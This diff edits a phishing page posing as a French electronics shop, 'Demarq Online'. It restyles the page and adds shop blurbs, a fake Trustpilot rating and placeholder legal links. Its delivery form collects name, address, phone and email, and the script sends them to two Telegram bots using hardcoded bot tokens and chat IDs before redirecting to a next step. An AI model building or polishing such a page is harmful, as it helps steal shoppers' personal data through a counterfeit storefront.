@@ -29,15 +29,16 @@
         header {
             background-color: #003f5f;
             color: white;
-            padding: 15px 20px;
+            padding: 20px;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
         .logo {
-            font-size: 22px;
+            font-size: 28px;
             font-weight: bold;
+            color: #00e6e6;
         }
 
         .search {
@@ -55,23 +56,41 @@
 
         .cart {
             font-weight: bold;
-            font-size: 15px;
+            font-size: 18px;
+            color: white;
         }
 
         /* الحاوية الرئيسية */
         .container {
-            max-width: 1000px;
-            margin: 30px auto;
-            padding: 20px;
+            max-width: 1100px;
+            margin: 40px auto;
+            padding: 40px;
             background-color: white;
-            border-radius: 10px;
-            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
         h1 {
-            font-size: 24px;
+            font-size: 28px;
             color: #003f5f;
             margin-bottom: 20px;
+        }
+
+        /* المعلومات التفصيلية */
+        .info-section {
+            margin-top: 20px;
+        }
+
+        .info-section h2 {
+            color: #003f5f;
+            font-size: 24px;
+            margin-bottom: 15px;
+        }
+
+        .info-section p {
+            font-size: 16px;
+            margin-bottom: 20px;
+            line-height: 1.6;
         }
 
         .form-section {
@@ -87,34 +106,81 @@
 
         .form-section input, .form-section select {
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             border-radius: 8px;
             border: 1px solid #ccc;
             font-size: 16px;
+            margin-bottom: 20px;
         }
 
-        .form-section .submit-btn {
+        .submit-btn {
             background-color: #e6005c;
             color: white;
             padding: 15px;
             font-size: 18px;
             text-align: center;
             width: 100%;
-            border-radius: 5px;
+            border-radius: 8px;
             border: none;
-            margin-top: 20px;
-        }
-
-        .form-section .submit-btn:hover {
-            background-color: #c0392b;
             cursor: pointer;
+            transition: background-color 0.3s;
         }
 
-        .form-section .required {
+        .submit-btn:hover {
+            background-color: #c0392b;
+        }
+
+        .required {
             color: red;
             font-size: 14px;
         }
 
+        /* Footer */
+        footer {
+            background-color: #003f5f;
+            color: white;
+            padding: 40px 20px;
+            margin-top: 40px;
+        }
+
+        .footer-logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00e6e6;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: #00e6e6;
+        }
+
+        .trust {
+            text-align: center;
+            color: #00e676;
+            font-size: 18px;
+            margin-top: 20px;
+        }
+
+        @media(max-width: 768px) {
+            .footer-links {
+                flex-direction: column;
+            }
+        }
     </style>
 </head>
 <body>
@@ -130,63 +196,72 @@
         <div class="search">
             <input type="text" placeholder="Senseo, lave-linge, TV 4K..." />
         </div>
-        <div class="cart">0 PANIER</div>
+        <div class="cart">1 🛒</div>
     </header>
 
-    <!-- النموذج لجمع المعلومات -->
+    <!-- المحتوى الرئيسي -->
     <div class="container">
         <h1>Informations de Livraison</h1>
         
-        <form id="customer-form">
-            <!-- معلومات العميل -->
-            <div class="form-section">
+        <div class="info-section">
+            <h2>Informations sur le site</h2>
+            <p>Bienvenue sur Demarq Online, votre destination en ligne pour tous vos besoins d'électronique. Nous offrons une large gamme de produits à des prix compétitifs et avec des options de livraison rapides et sûres. Notre site est conçu pour offrir la meilleure expérience d'achat en ligne.</p>
+        </div>
+
+        <div class="info-section">
+            <h2>Politique de Livraison</h2>
+            <p>Nous proposons différentes méthodes de livraison pour garantir que votre commande arrive en temps voulu et en toute sécurité. Choisissez parmi les options de livraison standard ou express. Les frais de livraison sont gratuits pour toute commande supérieure à 49€.</p>
+        </div>
+
+        <div class="form-section">
+            <h2>Veuillez entrer vos informations</h2>
+            <form id="customer-form">
+                <!-- معلومات العميل -->
                 <label for="full-name">Nom Complet <span class="required">*</span></label>
                 <input type="text" id="full-name" name="full-name" required />
-            </div>
 
-            <div class="form-section">
                 <label for="address">Adresse de Livraison <span class="required">*</span></label>
                 <input type="text" id="address" name="address" required />
-            </div>
 
-            <div class="form-section">
                 <label for="city">Ville <span class="required">*</span></label>
                 <input type="text" id="city" name="city" required />
-            </div>
 
-            <div class="form-section">
                 <label for="postal-code">Code Postal <span class="required">*</span></label>
                 <input type="text" id="postal-code" name="postal-code" required />
-            </div>
 
-            <div class="form-section">
                 <label for="phone">Numéro de Téléphone <span class="required">*</span></label>
                 <input type="tel" id="phone" name="phone" required />
-            </div>
 
-            <div class="form-section">
                 <label for="email">Email <span class="required">*</span></label>
                 <input type="email" id="email" name="email" required />
-            </div>
 
-            <!-- خيارات الشحن -->
-            <div class="form-section">
+                <!-- خيارات الشحن -->
                 <label for="shipping-method">Méthode de Livraison</label>
                 <select id="shipping-method" name="shipping-method">
                     <option value="standard">Livraison Standard (5 à 7 jours)</option>
                     <option value="express">Livraison Express (2 à 3 jours)</option>
                 </select>
-            </div>
 
-            <!-- زر الإرسال -->
-            <div class="form-section">
                 <button type="submit" class="submit-btn">Confirmer la Commande</button>
-            </div>
-        </form>
+            </form>
+        </div>
     </div>
 
+    <!-- Footer -->
+    <footer>
+        <div class="footer-logo">Demarq Online</div>
+        <div class="footer-links">
+            <a href="#">Qui sommes nous ?</a>
+            <a href="#">Conditions générales</a>
+            <a href="#">Mentions légales</a>
+            <a href="#">Politique de retour</a>
+        </div>
+        <div class="trust">
+            Excellent 4.6 sur 5 ★ Trustpilot
+        </div>
+    </footer>
+
     <script>
-        // إرسال البيانات إلى البوتات
         document.getElementById('customer-form').addEventListener('submit', function(event) {
             event.preventDefault();
             
@@ -199,48 +274,30 @@
             const email = document.getElementById('email').value;
             const shippingMethod = document.getElementById('shipping-method').value;
             
-            // إعداد البيانات التي سيتم إرسالها
+            // إعداد الرسالة
             const message = `Nom: ${fullName}\nAdresse: ${address}\nVille: ${city}\nCode Postal: ${postalCode}\nTéléphone: ${phone}\nEmail: ${email}\nMéthode de Livraison: ${shippingMethod}`;
             
-            // التوكنات والمعرفات الخاصة بالبوتات
-            const bot1Token = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
-            const bot2Token = '7238919189:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
-            const bot1Id = '5372119436';
-            const bot2Id = '5372111022';
-            
             // إرسال البيانات إلى البوت الأول
-            sendToTelegram(bot1Token, bot1Id, message);
-
+            sendToTelegram('7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw', '5372119436', message);
             // إرسال البيانات إلى البوت الثاني
-            sendToTelegram(bot2Token, bot2Id, message);
+            sendToTelegram('7238919189:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw', '5372111022', message);
 
-            // الانتقال إلى صفحة جديدة بعد إرسال البيانات
+            // الانتقال إلى صفحة جديدة بعد الإرسال
             window.location.href = 'traitement2.html'; // الانتقال إلى الصفحة التالية
         });
 
-        // دالة لإرسال الرسالة إلى بوت Telegram
         function sendToTelegram(token, chatId, message) {
             const url = `https://api.telegram.org/bot${token}/sendMessage`;
-            const params = {
-                chat_id: chatId,
-                text: message
-            };
+            const params = { chat_id: chatId, text: message };
 
-            // إرسال الطلب عبر POST
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(params)
             })
             .then(response => response.json())
-            .then(data => {
-                console.log('Message sent:', data);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+            .then(data => console.log('Message sent:', data))
+            .catch(error => console.error('Error:', error));
         }
     </script>
 </body>
